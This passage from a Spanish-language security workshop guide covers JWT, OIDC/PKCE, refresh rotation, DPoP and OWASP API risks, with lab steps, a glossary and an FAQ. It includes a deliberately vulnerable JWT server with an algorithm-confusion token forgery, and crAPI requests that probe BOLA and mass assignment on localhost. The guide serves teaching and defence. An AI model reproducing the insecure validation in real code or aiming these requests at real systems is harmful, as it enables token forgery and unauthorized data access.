openssl rsa -in priv.pem -pubout -out pub.pem
cat > lab_rs.py <<'PY'
## Servidor RS256 VULNERABLE A PROPÓSITO: acepta HS256 usando la clave pública como secreto.
from flask import Flask, request, jsonify
import jwt
app = Flask(__name__)
PUB = open("pub.pem").read()
@app.route("/r")
def r():
    tok = request.headers.get("Authorization","").replace("Bearer ","").strip()
    return jsonify(ok=True, claims=jwt.decode(tok, PUB, algorithms=["HS256","RS256"]))
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5001)
PY
python lab_rs.py &
sleep 2
python - <<'PY'
from pathlib import Path
import jwt
pub = Path("pub.pem").read_text()
forged = jwt.encode({"sub":"1","scope":"admin"}, pub, algorithm="HS256")
open("rs_attack.txt","w").write(forged)
PY
curl -s -H "Authorization: Bearer $(cat rs_attack.txt)" http://127.0.0.1:5001/r | jq
```

**Esperado:** el servidor acepta un token firmado con la **clave pública** como secreto HMAC.
**Qué demuestra:** permitir `algorithms=["HS256","RS256"]` abre la confusión de algoritmos. **Regla: el algoritmo se fija en el validador, no en el token.** (RFC 8725.)

---

### Parte C — OIDC, PKCE y refresh con Keycloak

#### Paso 12 — Levantar Keycloak

```bash
docker run -d --name keycloak -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:latest start-dev
```

Abrí http://localhost:8080 → Administration Console → `admin` / `admin`.

#### Paso 13 — Crear realm, cliente y usuario

1. **Realm:** menú superior izquierdo → *Create realm* → nombre `lab` → *Create*.
2. **Cliente:** *Clients* → *Create client* → Client ID `lab-web` → *Next* → **Client authentication: OFF** (cliente público) → *Next* → **Valid redirect URIs:** `http://localhost:8989/callback` → *Save*.
3. En la pestaña **Advanced** del cliente: **Proof Key for Code Exchange (PKCE): S256** (requerido). Guardá.
4. Para ver rotación de refresh: en **Settings** activá **Revoke Refresh Token** (y *Refresh Token Max Reuse = 0*).
5. **Usuario:** *Users* → *Add user* → username `tester` → *Create* → pestaña **Credentials** → *Set password* (sin temporal).

**Qué configura:** un IdP OIDC real en tu máquina, con PKCE y rotación de refresh.

#### Paso 14 — Ejecutar el flujo Authorization Code + PKCE

```bash
## Generar verifier y challenge (PKCE)
VERIFIER=$(python -c "import secrets; print(secrets.token_urlsafe(64))")
CHALLENGE=$(python -c "import hashlib,base64,sys; v=sys.argv[1].encode(); print(base64.urlsafe_b64encode(hashlib.sha256(v).digest()).rstrip(b'=').decode())" "$VERIFIER")
echo "verifier=$VERIFIER"; echo "challenge=$CHALLENGE"
```

Abrí en el navegador (reemplazá `CHALLENGE`):

```
http://localhost:8080/realms/lab/protocol/openid-connect/auth
  ?response_type=code
  &client_id=lab-web
  &redirect_uri=http://localhost:8989/callback
  &scope=openid profile email
  &state=abc123
  &nonce=n-0S6_WzA2Mj
  &code_challenge=CHALLENGE
  &code_challenge_method=S256
```

Iniciá sesión con `tester`. El navegador intentará ir a `http://localhost:8989/callback?code=XXXX&state=abc123` (fallará la carga, **es esperado**). **Copiá el `code`** de la barra de direcciones.

```bash
CODE="pegar-el-code"
VERIFIER="pegar-el-verifier"
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=authorization_code -d client_id=lab-web \
  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback \
  -d code_verifier="$VERIFIER" | tee tokens.json | jq
```

**Esperado:** JSON con `access_token`, `id_token`, `refresh_token`.
**Qué demuestra:** el código se cambia por tokens por **canal trasero**, protegido por PKCE.

#### Paso 15 — Decodificar el ID token

```bash
IDT=$(jq -r .id_token tokens.json)
python - "$IDT" <<'PY'
import sys, json, base64
p = sys.argv[1].split('.')[1]
p += '=' * (-len(p) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2, ensure_ascii=False))
PY
```

**Esperado:** `iss`, `aud`, `exp`, `sub`, `auth_time`, `amr`, `nonce`, `sid`.
**Qué demuestra:** el ID token dice **quién** y **cómo** se autenticó; va a la app, y **no** se usa para acceder a recursos.

#### Paso 16 — Probar que PKCE es obligatorio

Repetí el intercambio **sin** `code_verifier` (con un code nuevo):

```bash
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=authorization_code -d client_id=lab-web \
  -d code="$CODE" -d redirect_uri=http://localhost:8989/callback | jq
```

**Esperado:** error `invalid_grant` ("code_verifier missing"). Con Keycloak y PKCE obligatorio, el código robado **no sirve sin el verifier**.

#### Paso 17 — Refresh token y rotación

```bash
RT=$(jq -r .refresh_token tokens.json)
## Canje 1
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" > t2.json
RT2=$(jq -r .refresh_token t2.json)
echo "RT viejo: ${RT:0:20}..."; echo "RT nuevo: ${RT2:0:20}..."
## Reusar el VIEJO (debe fallar si hay rotación/revoke)
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT" | jq
```

**Esperado:** el refresh cambia y el viejo devuelve `invalid_grant`.
**Qué demuestra:** rotación + detección de reuso (lo que **RFC 9700** exige para clientes públicos).

#### Paso 18 — Revocación / logout

```bash
## Revocar el refresh
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/revoke \
  -d client_id=lab-web -d token="$RT2" -d token_type_hint=refresh_token -o /dev/null -w "%{http_code}\n"
## Verificar que ya no sirve
curl -s -X POST http://localhost:8080/realms/lab/protocol/openid-connect/token \
  -d grant_type=refresh_token -d client_id=lab-web -d refresh_token="$RT2" | jq
```

**Esperado:** revocación `200`; luego `invalid_grant`.
**Qué demuestra:** existe un endpoint de revocación ([RFC 7009](https://www.rfc-editor.org/rfc/rfc7009)) y el logout debe invalidar artefactos.

---

### Parte D — DPoP (sender-constrained)

#### Paso 19 — Construir una prueba DPoP (conceptual, local)

```bash
pip install cryptography
cat > dpop_proof.py <<'PY'
## DPoP: el CLIENTE firma una "prueba" con su clave privada. RFC 9449.
import json, base64, time, secrets
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64u_json(o): return b64u(json.dumps(o, separators=(',',':')).encode())

key = ec.generate_private_key(ec.SECP256R1())
header = {"typ": "dpop+jwt", "alg": "ES256",
          "jwk": {"kty":"EC","crv":"P-256",
                  "x": b64u(key.public_key().public_numbers().x.to_bytes(32,'big')),
                  "y": b64u(key.public_key().public_numbers().y.to_bytes(32,'big'))}}
claims = {"jti": secrets.token_urlsafe(16), "htm": "GET", "htu": "http://localhost:5000/safe",
          "iat": int(time.time())}
signing_input = (b64u_json(header) + "." + b64u_json(claims)).encode()
der = key.sign(signing_input, ec.ECDSA(hashes.SHA256()))
r, s = decode_dss_signature(der)
sig = b64u(r.to_bytes(32,'big') + s.to_bytes(32,'big'))
print(signing_input.decode() + "." + sig)
PY
python dpop_proof.py
```

**Qué demuestra:** la prueba ata el token al método (`htm`), a la URL (`htu`) y a un `jti` único. El servidor debe validar los tres y rechazar repeticiones. Un bearer robado **no sirve** sin esta clave. Comparar: es el mismo espíritu de OAuth 1.0, pero sin canonicalización y sobre JSON.

> Demostración de valor: repetí el token bearer del Paso 4 desde otro cliente (funciona). Con DPoP, el mismo token sin la prueba del cliente **no** funciona.

---

### Parte E — OWASP API Top 10 con crAPI

#### Paso 20 — Levantar crAPI

```bash
git clone https://github.com/OWASP/crAPI.git
cd crAPI/deploy/docker
docker compose --env-file .env up -d
```

> Si algún comando cambió, seguí el README del repositorio: https://github.com/OWASP/crAPI
> crAPI queda en http://localhost:8888.

#### Paso 21 — Registrar usuario y obtener token

```bash
## 1) Registro (adaptá el host/puerto al de tu despliegue)
curl -s -X POST http://localhost:8888/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"tester","email":"tester@lab.local","number":"5551234567","password":"Test1234!"}'
## 2) Login (devuelve un token)
curl -s -X POST http://localhost:8888/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@lab.local","password":"Test1234!"}' | tee login.json | jq
TOKEN=$(jq -r .token login.json)
echo "$TOKEN"
```

#### Paso 22 — API1: BOLA (el más importante)

1. En la interfaz de crAPI, creá un pedido/video y anotá su ID.
2. Con Burp/Postman (o `curl`), pedí **otro** ID del mismo tipo:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/orders/<OTRO_ID> | jq
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8888/workshop/api/shop/products | jq
```

**Esperado:** si devuelve datos de otro usuario, hay **BOLA**.
**Qué demuestra:** token válido + autorización a nivel de objeto ausente. **Api1 OWASP** — la vulnerabilidad número uno.

#### Paso 23 — API3: Mass assignment / BOPLA

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/v3/check-otp \
  -H "Content-Type: application/json" -d '{"email":"tester@lab.local","otp":"0000"}'
## Probá enviar campos de rol/saldo en endpoints de actualización (en el lab):
curl -s -X PUT http://localhost:8888/identity/api/v2/user/personal \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"x","role":"admin","balance":999999}'
```

**Qué demuestra:** si el backend acepta campos que no debería, el cliente controla propiedades sensibles.

#### Paso 24 — API4/API9: consumo y versiones

```bash
## Rate limit / consumo: repetí una búsqueda costosa N veces
for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN" "http://localhost:8888/workshop/api/shop/products"; done; echo
## Inventario: buscar versiones/swaggers expuestos
for p in /swagger /v1 /v2 /api /openapi.json /docs; do echo -n "$p -> "; curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8888$p; done
```

**Qué demuestra:** ausencia de límites (Api4) e inventario desactualizado expuesto (Api9).

> Mapeo completo de los 10 riesgos y cómo probarlos: ver Módulo **M10** de `clase_tokens_seguridad.md`.

---

### Parte F — ID Uruguay (defensivo)

> **Línea estricta:** sólo tu cuenta y tu cliente de desarrollo. No se prueba el IdP ni clientes de terceros. Para evaluar el IdP, coordiná con **AGESIC** / **CERTuy**.

#### Paso 25 — Recabar la evidencia documental

Abrí y leé:
- https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0
- https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf

**Buscá:** `token_type`, `Bearer`, `id_token`, `JWT`, `code_challenge`, `redirect_uri`.
**Qué demuestra:** el Estado uruguayo emite tokens bearer vía OIDC; el ID token es un JWT. Es evidencia **sin tocar nada**.

#### Paso 26 — Observar tu propio flujo (con tu cuenta)

1. Iniciá sesión en **tu** aplicación integrada (o tu cliente de pruebas registrado).
2. DevTools → **Network** → filtrá `token` / `authorization`.
3. Localizá la respuesta del *token endpoint* y la petición con `Authorization: Bearer ...`.
4. **Enmascará el token** en pantalla (mostrá el inicio y tapá el resto).

**Qué demuestra:** el token es legible y extraíble del navegador; "quien lo tiene, lo usa". Sin ningún acceso indebido.

#### Paso 27 — Decodificar tu ID token (offline)

Copiá **tu** ID token y pegalo en https://jwt.io (decodifica en el navegador, no viaja a ningún servidor).

**Esperado:** `iss`, `aud`, `sub`, `exp`, `auth_time`, `amr`/`acr` según configuración.
**Qué demuestra:** qué dice tu token y qué claims debería validar tu app.

#### Paso 28 — Checklist de verificación de TU integración

Completá esta tabla mirando **tu** código/configuración (no el IdP):

| Control | Cómo verificarlo en tu cliente | Esperado |
|---|---|---|
| PKCE | `code_challenge` + `method=S256` en tu authorization request | Presente |
| `redirect_uri` exacta | URI registrada sin comodines; tu app la valida | Coincidencia exacta |
| `state` | Generado aleatorio y validado al volver | Presente y de un solo uso |
| `nonce` | Enviado en el request OIDC y validado en el ID token | Presente |
| Validación del ID token | Tu código valida `iss`, `aud`, `exp`, `nonce`, firma (JWKS) | Todo validado |
| No usar ID token para APIs | Buscá en tu código si el ID token viaja a la API | Nunca |
| Vida del access token | Decodificá `exp` de tu access token | Corta (minutos/horas) |
| Rotación de refresh | Repetí refresh: ¿cambia? ¿el viejo se invalida? | Rotación + detección |
| Revocación/logout | Cerrá sesión y reintentá con el token viejo | Rechazado |
| Transporte | Sólo HTTPS; token en header (no en query/URL) | Cumplido |
| Almacenamiento | Memoria o cookie `HttpOnly`; no `localStorage` | Sin acceso por JS |

#### Paso 29 — Reproducción de la demostración para clase

Seguí el guion del **Módulo M11**: documentación → DevTools con token enmascarado → decode en jwt.io → cierre de sesión → frase de cierre.
**Qué demuestra:** todo el argumento de la charla con un caso uruguayo real, sin invadir nada.

#### Paso 30 — Si encontrás algo: reporte responsable

Usá la plantilla del archivo `clase_tokens_seguridad.md` (Sección 5) y canalizá por:
- **CERTuy (AGESIC):** https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/
- Contacto del equipo dueño del sistema.

Incluí alcance probado, pasos mínimos y evidencia enmascarada. **No** accedas a datos de terceros para "probar impacto".

---

### Limpieza

```bash
docker stop keycloak juice 2>/dev/null; docker rm keycloak juice 2>/dev/null
## crAPI
cd crAPI/deploy/docker && docker compose down -v
## procesos locales
##   Ctrl+C en las terminales de lab_jwt.py y lab_rs.py
```

---

### Resumen: paso → qué demuestra

| Pasos | Tema | Qué se comprueba | Riesgo |
|---|---|---|---|
| 0–4 | Basic, API key, OAuth1, bearer | Credenciales por request, clave estática, firma, replay | Nulo (endpoints de práctica) |
| 5 | Cookies | HttpOnly/Secure/SameSite | Nulo (local) |
| 6–11 | JWT | `alg:none`, secreto débil, `exp`/`aud`, confusión HS/RS | Local |
| 12–18 | OIDC/PKCE/refresh | PKCE obligatorio, claims, rotación, revocación | Local |
| 19 | DPoP | Prueba de posesión por request | Local |
| 20–24 | OWASP Top 10 | BOLA, BOPLA, consumo, inventario | Local (crAPI) |
| 25–30 | ID Uruguay | Evidencia + verificación defensiva de tu integración | Nulo / tu entorno |

**Regla final:** *si dudás si tenés permiso para un paso, no lo hagas. En seguridad, la autorización también es un control.*

## 8. Glosario de atajos

| Término | Significado |
|---|---|
| **BOLA / IDOR** | Presentar token válido para acceder a objetos de otro (Api1 OWASP). |
| **BOPLA** | Mass assignment / controlar propiedades que no deberías (Api3). |
| **BFLA** | Llamar funciones para las que no tenés permiso (Api5). |
| **Replay** | Reutilizar un artefacto capturado (token, prueba) sin cambios. |
| **Sender-constrained** | Token que exige prueba de posesión (mTLS, DPoP). |
| **PKCE** | Candado del authorization code para clientes públicos (RFC 7636). |
| **`alg: none` / confusión de alg** | Clases de ataque sobre JWT al confiar en el header del token. |
| **AiTM** | Adversary-in-the-Middle: phishing que roba la sesión ya autenticada. |
| **Infostealer / pass-the-cookie** | Malware que roba cookies/tokens del navegador. |
| **MFA fatigue (T1621)** | Bombardeo de pushes hasta obtener aprobación. |
| **NHI** | Identidad no humana (servicio, CI, device). |
| **JWKS** | Conjunto de claves públicas para validar JWTs. |
| **Diff channel** | *Front channel* (navegador) vs *back channel* (servidor a servidor). |

---

### Ampliación del glosario (enfoques, dominios y normativa)

| Término | Significado |
|---|---|
| **API Gateway** | Componente de entrada que enruta, autentica, aplica cuotas y observa el tráfico. |
| **Rate limiting / cuota / throttling** | Límites de caudal por identidad, IP o recurso; base del control de abuso (Api4). |
| **IAM** | Identity and Access Management: administración de identidades y sus permisos. |
| **RBAC / ABAC / ReBAC / PBAC** | Modelos de autorización por roles / atributos / relaciones / políticas. |
| **Policy as code** | Política de autorización versionada y ejecutada por un motor (p. ej. OPA/Rego, Cedar). |
| **NHI** | Non-Human Identity: identidad de servicio, workload, CI o dispositivo. |
| **SPIFFE/SPIRE** | Estándar y proyecto (CNCF) de identidad de workload con rotación automática. |
| **Zero Trust** | Modelo de "verificar siempre, mínimo privilegio, asumir la brecha" (NIST SP 800-207). |
| **SSRF** | Server-Side Request Forgery: inducir al servidor a pedir una URL interna (Api7). |
| **XXE** | XML External Entity: entidades externas en parsers XML. |
| **Deserialización insegura** | Reconstruir objetos a partir de datos no confiables y ejecutar efectos. |
| **Mass assignment (BOPLA)** | El cliente controla propiedades que no debería (Api3). |
| **Shadow / zombie API** | API olvidada o sin mantenimiento, expuesta sin control (Api9). |
| **SBOM / SCA** | Inventario de componentes de software y análisis de dependencias. |
| **Threat modeling / STRIDE / LINDDUN** | Metodologías para anticipar amenazas (seguridad / privacidad). |
| **OWASP SAMM** | Modelo de madurez de seguridad de software. |
| **WAF** | Web Application Firewall: filtrado de ataques conocidos en el borde. |
| **Service mesh** | Malla de servicios con mTLS e identidad de workload (tráfico este-oeste). |
| **JOSE (JWS/JWE/JWK/JWA)** | Familia de firma, cifrado, claves y algoritmos para tokens (RFC 7515–7518). |
| **PKI / KMS / HSM** | Infraestructura de clave pública / gestión de claves / módulo de hardware. |
| **CORS / HSTS** | Política de orígenes cruzados / forzado de HTTPS en el navegador. |
| **Capability / confused deputy** | Facultad de acceso por posesión; problema del "delegado confundido" (Hardy, 1988). |
| **BOLA / BFLA** | Autorización rota a nivel de objeto (Api1) / de función (Api5). |
| **PCI DSS** | Estándar de la industria de tarjetas de pago. |
| **Ley 18.331 (Uruguay)** | Protección de Datos Personales; regula la URCDP. |
| **Decreto 66/025 (Uruguay)** | Obligaciones de ciberseguridad, incluida la gestión de incidentes y el reporte a CERTuy. |
| **CERTuy** | Centro Nacional de Respuesta a Incidentes de Seguridad Informática (AGESIC). |
| **AGESIC** | Agencia de Gobierno Electrónico y Sociedad de la Información y del Conocimiento (Uruguay). |

---

## 9. Plantilla de reporte responsable

```
Asunto: [Divulgación Responsable] Posible <vulnerabilidad> en <sistema>

1. Resumen (2-3 líneas)
2. Impacto estimado (qué datos/acciones compromete)
3. Alcance probado (cuenta propia / cliente de prueba; qué NO se tocó)
4. Pasos de reproducción (mínimos, sin datos de terceros)
5. Evidencia (capturas enmascaradas, timestamps)
6. Recomendación de mitigación
7. Declaración: no se accedió a datos de terceros ni se alteró información
8. Contacto y disponibilidad para coordinar
```

En Uruguay, canal oficial: **CERTuy (AGESIC)** — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/

---

## 10. Bibliografía

**Normas IETF:** [RFC 2617](https://www.rfc-editor.org/rfc/rfc2617) · [RFC 7616](https://www.rfc-editor.org/rfc/rfc7616) · [RFC 6265](https://www.rfc-editor.org/rfc/rfc6265) · [RFC 5849](https://www.rfc-editor.org/rfc/rfc5849) · [RFC 6749](https://www.rfc-editor.org/rfc/rfc6749) · [RFC 6750](https://www.rfc-editor.org/rfc/rfc6750) · [RFC 6819](https://www.rfc-editor.org/rfc/rfc6819) · [RFC 7009](https://www.rfc-editor.org/rfc/rfc7009) · [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519) · [RFC 7636](https://www.rfc-editor.org/rfc/rfc7636) · [RFC 7662](https://www.rfc-editor.org/rfc/rfc7662) · [RFC 8176](https://www.rfc-editor.org/rfc/rfc8176) · [RFC 8252](https://www.rfc-editor.org/rfc/rfc8252) · [RFC 8705](https://www.rfc-editor.org/rfc/rfc8705) · [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725) · [RFC 9068](https://www.rfc-editor.org/rfc/rfc9068) · [RFC 9449](https://www.rfc-editor.org/rfc/rfc9449) · [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700)

**Identidad y gobierno:** [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html) · [NIST SP 800-63-4 (jul 2025)](https://pages.nist.gov/800-63-4/) · [Marco de Ciberseguridad de Uruguay (AGESIC)](https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/tematica/gestion-ciberseguridad)

**OWASP y labs:** [API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) · [JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) · [WSTG](https://owasp.org/www-project-web-security-testing-guide/) · [crAPI](https://owasp.org/projects/crapi) · [Juice Shop](https://owasp.org/www-project-juice-shop/) · [PortSwigger Academy](https://portswigger.net/web-security)

**Casos reales:** [Meta "View As" 2018](https://about.fb.com/news/2018/09/security-update/) · [Cloudflare/Okta 2023](https://blog.cloudflare.com/how-cloudflare-mitigated-yet-another-okta-compromise/) · [Okta 2022 (sin impacto en Cloudflare)](https://blog.cloudflare.com/cloudflare-investigation-of-the-january-2022-okta-compromise/) · [Codecov 2021](https://about.codecov.io/security-update/) · [GitGuardian Secrets Sprawl 2026](https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/) · [Uber 2022 (UpGuard)](https://www.upguard.com/blog/what-caused-the-uber-data-breach)

**Uruguay / ID Uruguay:** [Documentación técnica ID Uruguay (gub.uy)](https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0) · [Desarrollo seguro (AGESIC, PDF)](https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf) · [CERTuy](https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/)

## 11. Preguntas frecuentes (FAQ)

Este anexo reúne, en formato de preguntas y respuestas, los puntos que más se repiten al dar la
charla y los que surgieron al revisarla. Sirve como **material de repaso** para el público y como
**preparación del turno de preguntas** para quien expone. No reemplaza a las secciones anteriores:
las referencia.

### 11.1 ¿Qué es HMAC-SHA1 y por qué importa?

**HMAC** (*Keyed-Hash Message Authentication Code*, RFC 2104) no es un cifrado: es un **código de
autenticación**. Combina **una clave secreta** con **una función de hash** para producir una etiqueta
que prueba **integridad** (nadie cambió el mensaje) y **autenticidad** (lo generó alguien que tiene la
clave):

```
HMAC(K, m) = H( (K ⊕ opad) || H( (K ⊕ ipad) || m ) )
```

- **SHA-1** es el hash (160 bits, NIST 1995). **HMAC-SHA1** es ese MAC con SHA-1.
- Es **simétrico**: la misma clave firma y verifica (a diferencia de RSA/ECDSA, que son asimétricos);
  eso obliga a **distribuir y custodiar el secreto** en ambos extremos.
- **Dónde aparece:** OAuth 1.0 firmaba **cada request** con HMAC-SHA1 (más `nonce` y `timestamp`); en
  JOSE, **HS256/384/512** es HMAC con SHA-256/384/512.
- **Matiz:** SHA-1 está roto para **colisiones** (SHAttered, 2017), pero **HMAC-SHA1 no está roto como
  MAC**. Aun así está **deprecado**: hoy se prefiere **SHA-256**.
- **Por qué se abandonó el firmar-por-request:** no por la cripto, sino por la operación —repartir un
  secreto distinto entre cada par de servicios y **canonicalizar** parámetros (orden, codificación)
  era frágil y muy difícil en móviles y SPAs (ver §3.4).

### 11.2 ¿Base64 es cifrado? ¿Todos los bearer tokens usan base64url?

- **No, base64 no es cifrado.** Es una **codificación**: representa bytes binarios como texto seguro
  para JSON/URL/HTTP. **No tiene clave** y se revierte con dos líneas.
- **No todos los bearer usan base64.** Base64url aparece en **JWT/JOSE** (para `header`, `payload` y
  `signature`). Un **bearer opaco** suele ser **bytes aleatorios**, sin estructura.
- **base64url vs. base64 estándar:** usa `-` y `_` en vez de `+` y `/`, y omite el relleno `=`, para
  viajar seguro en URLs.
- **Qué es cifrado, entonces:** *cifrado* (encryption) transforma los datos **con una clave** para dar
  **confidencialidad**: sin la clave, no se leen. En JOSE, el cifrado real es **JWE**. Un **JWT común
  es JWS: firmado, no sellado** — su payload **lo lee cualquiera** (ver §3 anatomía del JWT y §11.4).

### 11.3 ¿Qué son los claims, y qué son `amr` y `acr`?

- **Claims** son los **campos** (afirmaciones) del payload de un JWT: pares clave/valor. Los estándar
  incluyen `iss` (emisor), `sub` (sujeto), `aud` (audiencia), `exp` (expira), `nbf` (no antes), `iat`
  (emitido), `jti` (id único) y `scope`. Puede haber **claims propios** (cuidado con la PII).
- **`amr`** (*Authentication Method Reference*, RFC 8176): dice **cómo** se autenticó, como lista.
  Ej.: `["pwd","otp"]`, `["pwd","mfa","hwk"]` (llave de hardware), `["swk"]`.
- **`acr`** (*Authentication Context Class Reference*): dice **con qué nivel/contexto** se autenticó
  (una etiqueta que se puede mapear, p. ej., a los niveles AAL de NIST). En corto: **`amr` = con qué
  métodos; `acr` = con qué garantía**.
- **Matiz clave de la charla:** la API **no sabe** si hubo MFA **salvo** que el emisor ponga `amr`/`acr`
  **y** el validador los **revise**. De ahí el *step-up*: pedir más garantía solo para la operación
  sensible.

### 11.4 ¿Qué es JOSE (JWS, JWE, JWK, JWA, JWT)?

**JOSE** = *JavaScript Object Signing and Encryption*: la **familia** de estándares detrás del JWT.

- **JWS** (RFC 7515): **firma**. **JWE** (RFC 7516): **cifrado**. **JWK** (RFC 7517): **claves**.
- **JWA** (RFC 7518): **algoritmos**. **JWT** (RFC 7519): el **token con claims**.
- **RFC 8725**: buenas prácticas. **RFC 9068**: perfil de JWT para access tokens.
- Todo se codifica en **base64url**. Regla de oro: **JWS = firmado (legible); JWE = cifrado
  (confidencial)**.

### 11.5 ¿Qué relación tienen las versiones de HTTP con el token?

Versiones: **HTTP/0.9**, **1.0 (1996)**, **1.1 (1997)**, **HTTP/2 (2015)**, **HTTP/3 (2022, sobre
QUIC/UDP)**. Lo que **sí** toca al token:

- El header **`Authorization`** y las **cookies** son conceptos de **HTTP** (independientes de la
  versión); todo token viaja **dentro** de HTTP.
- **HTTP/2**: framing binario, **multiplexing** y **compresión de cabeceras (HPACK)**. Comprimir
  cabeceras con secretos habilita ataques de **compresión** (familia BREACH/CRIME); el multiplexing
  cambió cómo aparecen los *request smuggling*.
- **HTTP/3 (QUIC)**: transporte sobre UDP, **QPACK** y **TLS 1.3 obligatorio**; cambia el
  comportamiento de proxies e inspección (misma ceguera que con gRPC binario).
- **Marco de autenticación HTTP**: se reorganizó de **RFC 2617** → **RFC 7235 (2014)** → **RFC 9110
  (2022)**; **Basic** pasó a **RFC 7617** y **Digest** a **RFC 7616**.
- **HTTP/1.1** popularizó el header `Referer`: por eso el token en **query** se filtra a otros sitios.
  **RFC 9700 (2025)** prohíbe el token en la URL.

En síntesis: la versión de HTTP **no crea** el problema del bearer, pero **cambia la superficie**
(compresión de cabeceras, inspección de binario, smuggling, terminación TLS). Ver §4.1.

### 11.6 ¿Qué fue primero: la cookie o Digest?

**La cookie.** El orden de primera aparición pública es:

1. **HTTP Basic** — concepto de 1993; en el RFC 1945 (HTTP/1.0, 1996).
2. **Cookie** — Netscape, idea de **1994**, especificación pública hacia **1996**.
3. **Digest** — estandarizado en el **RFC 2069 (1997)** y luego en el **RFC 2617 (1999)**.

O sea, **la cookie es anterior a la estandarización de Digest**. Digest, además, no manda la
contraseña en claro sino un **hash con un `nonce`** (v1: MD5; el RFC 7616, 2015, admite SHA-256). Pero
el servidor necesita guardar el **HA1**, que es **equivalente a la contraseña**, y el esquema no
protege el cuerpo del mensaje; quedó prácticamente en desuso. Hoy sobrevive sobre todo **Basic**, como
`client_secret_basic` en OAuth. Ver §3.1.

### 11.7 ¿Qué diferencia hay entre mTLS y DPoP?

- **mTLS** (mutual TLS): **ambas** partes presentan certificado. Da **autenticación fuerte de
  cliente** y permite **atar el token al certificado** (RFC 8705): el servidor exige el **mismo
  certificado** en cada llamada. Robar el token **no alcanza**. Costo: **PKI**, rotación de
  certificados y cuidado con proxies/balanceadores que **terminan TLS** y rompen la atadura.
- **DPoP** (RFC 9449, 2023): **sin PKI**. El cliente genera un par de claves; manda
  `Authorization: DPoP <token>` + una cabecera **`DPoP`** con un **JWT firmado por su clave privada**,
  que incluye **`jti`** único (anti-replay), **`htm`** (método) y **`htu`** (URL). El servidor valida
  la prueba y rechaza el token sin ella; robar el access token **no sirve**. Hay que registrar los
  `jti` usados y controlar la ventana de `iat`.

Ver §11.11 (prueba de posesión) y §4 (protocolos).

### 11.8 ¿Por qué una passkey resiste el phishing?

- Una **passkey** es una credencial **WebAuthn/FIDO2** (W3C/FIDO, 2019): un **par de claves** por
  sitio. La **privada** vive en un autenticador (TPM, Secure Enclave, llave de hardware) y **nunca
  sale**; el servidor guarda la **pública**.
- El servidor manda un **desafío**; el autenticador firma `challenge` + `origin`/RP ID; el servidor
  verifica con la pública. **No viaja ningún secreto compartido**.
- **Resiste el phishing por diseño:** el `origin` va **atado criptográficamente** a la firma. Si te
  llevan a `evil.com`, el autenticador **no firma para ese origen** (o firma un dominio que el servidor
  real rechaza). El atacante **no puede reusar** la firma.
- **Contraste:** **TOTP/OTP** se puede **phishear en tiempo real** (AiTM) y **SMS** es el más débil.
  NIST SP 800-63-4 (jul. 2025) empuja los factores *phishing-resistant*. Ver §M10/Bloque 4.

### 11.9 ¿Qué son la fatiga de push, MITRE ATT&CK, AiTM, los infostealers y el pass-the-cookie?

- **Fatiga de push / push bombing:** el atacante **ya tiene la contraseña** y dispara **muchos push**
  hasta que la víctima aprueba uno. Es **MITRE ATT&CK T1621** (*MFA Request Generation*).
- **MITRE ATT&CK:** la **matriz pública de tácticas y técnicas** de adversarios (táctica = por qué;
  técnica = cómo). Las de acá: **T1621** y **T1539** (*Steal Web Session Cookie*).
- **Phishing AiTM** (*adversary-in-the-middle*): un **proxy inverso** entre víctima y sitio real. No
  roba solo la contraseña: **intercepta la sesión ya autenticada** (cookie/token que resultó de la
  MFA). La MFA "pasó", pero el atacante se quedó con la sesión.
- **Infostealer:** **malware** que extrae del navegador **cookies, tokens y credenciales** y los manda
  al atacante.
